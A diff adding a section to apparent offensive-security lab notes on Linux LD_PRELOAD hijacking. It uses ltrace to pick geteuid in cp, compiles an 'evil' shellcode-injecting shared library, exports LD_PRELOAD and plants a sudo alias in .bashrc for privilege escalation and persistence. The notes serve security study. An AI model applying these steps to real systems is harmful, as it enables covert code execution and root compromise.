@@ -194,3 +194,31 @@ offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/
 alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
 source ~/.bashrc
 ```
+
+#### Exploitation via LD_PRELOAD
+LD_PRELOAD is an environment variable. When defined, it forces dynamic linking loader to preload a particular shared library before any others. This means that methods we define in a library loaded by LD_PRELOAD will override methods loaded later on. For this attack vector, we first need to find an application that the victim is likely to frequently use. One potential option is the cp command.
+
+- 1.We can run ltrace on the cp command to get a list of library function calls it uses during normal operation. geteuid function is a good candidate
+because it seems to only be called once during the application run, which limits how frequently our code will be executed.
+our code will be executed.
+ 
+```
+offsec@linuxvictim:~$ ltrace cp
+strrchr("cp", '/') = nil
+...
+geteuid() = 1000
+getenv("POSIXLY_CORRECT") = nil
+```
+
+- 2.Write[preloadshellcode.c]() to define custom geteuid and inject our shell code, compile c code. Set the LD_PRELOAD env. 
+
+```
+offsec@linuxvictim:~$ gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o preloadshellcode.c
+offsec@linuxvictim:~$ gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
+offsec@linuxvictim:~$ export LD_PRELOAD=/home/offsec/evil_geteuid.so
+```
+
+Create sudo LD_PRELOAD alias in .bashrc.
+```
+alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"
+```
